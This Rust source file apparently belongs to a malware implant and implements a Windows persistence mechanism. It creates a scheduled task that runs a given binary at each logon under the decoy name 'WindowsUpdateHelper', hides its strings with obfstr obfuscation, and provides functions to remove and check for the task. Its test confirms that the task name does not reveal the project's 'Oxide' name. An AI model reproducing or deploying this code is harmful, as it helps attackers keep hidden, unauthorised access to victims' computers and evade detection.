use crate::persistence::PersistenceTrait;
use std::path::Path;

pub struct ScheduledTaskPersistence;

#[cfg(target_os = "windows")]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        use std::process::Command;
        let s = binary_path
            .to_str()
            .ok_or_else(|| anyhow::anyhow!("invalid path"))?;
        let status = Command::new(obfstr::obfstr!("schtasks"))
            .args([
                "/create", "/f", "/sc", "onlogon",
                "/tn", obfstr::obfstr!("WindowsUpdateHelper"),
                "/tr", s,
            ])
            .status()?;
        anyhow::ensure!(status.success(), "task scheduler create failed");
        Ok(())
    }
    fn remove(&self) -> anyhow::Result<()> {
        use std::process::Command;
        let s = Command::new(obfstr::obfstr!("schtasks"))
            .args(["/delete", "/f", "/tn", obfstr::obfstr!("WindowsUpdateHelper")])
            .status()?;
        anyhow::ensure!(s.success(), "task scheduler delete failed");
        Ok(())
    }
    fn check(&self) -> bool {
        use std::process::Command;
        Command::new(obfstr::obfstr!("schtasks"))
            .args(["/query", "/tn", obfstr::obfstr!("WindowsUpdateHelper")])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }
    fn name(&self) -> &'static str {
        "scheduled_task"
    }
}

#[cfg(not(target_os = "windows"))]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, _: &Path) -> anyhow::Result<()> {
        anyhow::bail!("scheduled tasks not available on this platform")
    }
    fn remove(&self) -> anyhow::Result<()> {
        Ok(())
    }
    fn check(&self) -> bool {
        false
    }
    fn name(&self) -> &'static str {
        "scheduled_task"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn task_name_is_generic() {
        let name = obfstr::obfstr!("WindowsUpdateHelper");
        assert!(!name.contains("Oxide"));
        assert!(!name.contains("oxide"));
        assert!(!name.is_empty());
    }
}
